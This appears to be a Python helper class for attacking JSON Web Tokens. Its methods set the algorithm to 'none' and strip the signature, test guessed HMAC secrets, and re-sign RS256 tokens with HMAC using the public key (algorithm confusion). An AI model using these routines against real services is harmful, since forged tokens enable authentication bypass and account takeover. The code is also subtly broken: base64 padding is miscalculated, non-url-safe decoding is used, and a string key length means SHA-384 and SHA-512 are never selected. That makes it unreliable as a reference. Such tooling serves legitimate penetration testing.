#! /usr/bin/python3
import sys
import hashlib
import hmac
import base64
import json
from collections import OrderedDict

class JWT:
	'Class to store and test JWTs'
	def __init__(self, token):
		tok1, tok2, sig = token.split(".",3)
		#Needs padding, without it could fail
		head = base64.b64decode(tok1 + "=" * (len(tok1) % 4))
		payl = base64.b64decode(tok2 + "=" * (len(tok2) % 4))
		self.headDict = json.loads(head, object_pairs_hook=OrderedDict)
		self.paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
		self.signature = sig
	
	#To print the object easily
	def __str__(self):
		#header
		jsonDump = json.dumps(self.headDict,separators=(",",":"))
		header = base64.urlsafe_b64encode(jsonDump.encode('utf-8'))
		header = (header.decode('utf-8')).strip("=")
		#payload
		jsonDump = json.dumps(self.paylDict,separators=(",",":"))
		payload = base64.urlsafe_b64encode(jsonDump.encode('utf-8'))
		payload = (payload.decode('utf-8')).strip("=")
		#signature
		signature = self.signature
		return (f"{header}.{payload}.{signature}")

	def edit_token(self, name, value, isHeader):
		if(isHeader):
			self.headDict[name] = value
		else:
			self.paylDict[name] = value

	def strip_signature(self):
		self.edit_token("alg","none",True)
		self.signature = ""

	def sign_token_HS_urlsafe(self, key, keyLength):
		self.edit_token("alg",f"HS{keyLength}",True)
		#Prepare content and head for signing
		jsonPayload = json.dumps(self.paylDict,separators=(",",":"))
		jsonHead = json.dumps(self.headDict,separators=(",",":"))
		bs64Payload = (base64.urlsafe_b64encode(jsonPayload.encode('utf-8'))).decode('utf-8').strip("=")
		bs64Head = (base64.urlsafe_b64encode(jsonHead.encode('utf-8'))).decode('utf-8').strip("=")
		newContents = f"{bs64Head}.{bs64Payload}"
		#Must convert in bytes for the digest function
		newContents_b = newContents.encode('utf-8')
		key_b = key.encode('utf-8')
		if (keyLength == 384):
			sig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha384).digest())
		elif (keyLength == 512):
			sig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha512).digest())
		else:
			sig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha256).digest())
		self.signature = sig.decode('utf-8').strip("=")

	def check_key_HS(self, key):
		if(self.headDict["alg"][:2] != "HS"):
			raise RuntimeError("Algorithm is not HMAC-SHA")
		confirmed = False
		old_sig = self.signature
		self.sign_token_HS_urlsafe(key, self.headDict["alg"][2:])
		
		#print(f"[DEBUG] test: {old_sig} - original: {self.signature}")
		if(old_sig == self.signature):
			confirmed = True
		#Restore to previous state
		self.signature = old_sig
		return confirmed

	def check_rsa_bypass(self, pubKey):
		#I check if the token sent is signed asymmetrically
		if(self.headDict["alg"][:2] != "RS"):
			raise RuntimeError("Signature is already symmetrical")
		with open(pubKey) as filekey:
			key = filekey.read()
			self.sign_token_HS_urlsafe(key, self.headDict["alg"][2:])
